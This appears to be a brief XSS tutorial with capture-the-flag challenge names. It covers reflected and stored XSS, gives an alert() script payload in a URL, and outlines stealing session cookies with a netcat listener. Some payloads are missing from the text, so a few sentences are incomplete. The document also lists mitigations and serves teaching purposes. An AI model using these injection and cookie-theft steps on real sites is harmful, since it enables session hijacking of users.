# XSS

XSS or Cross-site Scripting is a client side attack, where malicious scripts are injected into the web application, and executed by loading it through the web browser, this vulnerability occurs in the web application where the user-input is not validated and sanitized.

## Impact
1. Account hijacking by stealing user session cookies
2. Stealing user credentials
3. Keylogger, it is possible to log all user keystrokes 

## Types of XSS
1. Reflected XSS
2. Stored XSS
3. DOM-based XSS


1. **Reflected XSS**

The reflected xss is one of the common types , in which the injected payload is returned in the vulnerable page immediately and executed by the web browser 

For example consider a web application with a search input field, when inserting any input it will be echoed back into the web page. eg, search test.

The attacker can send basic XSS payload like , which will return a pop up message .

There different approaches to inject your payload like hosting it on your own server and injecting the URL of the payload using Javascript src attribute.

2. **Stored XSS**

Is the dangerous type , where the injected payload is stored and displayed later when it is retrieved , it can be stored in the database , cookies , or session data and when retrieved and viewed it will be executed .

Sometimes there are some validations that detect the XSS basic payloads .

The following are some techniques that could bypass it :
```
http://localhost/test.php#<script>alert("XSS test")</script>
```

## XSS Exploitation

It is possible to steal user cookies using xss , for example you can send the following payload : 
```
/test.php#
```

Then on your server , run the following netcat command to listen to port 4444 
```
nc –lvp 4444
```

This command will return the user cookies in the output of the netcat command.

## Mitigation
1. Validate user-input against a whitelist for the allowed input
2. Using HTML & URL encoding before returning user input .
3. Using X-XSS-Protection header .
4. Using Content Security Policy (CSP) to reduce the possibility of XSS .
5. Using HTTPOnly Flags on the Cookies .

## Challenges
1. Cool Name Effect
2. uGame
3. Searching for the cookie
4. x corp
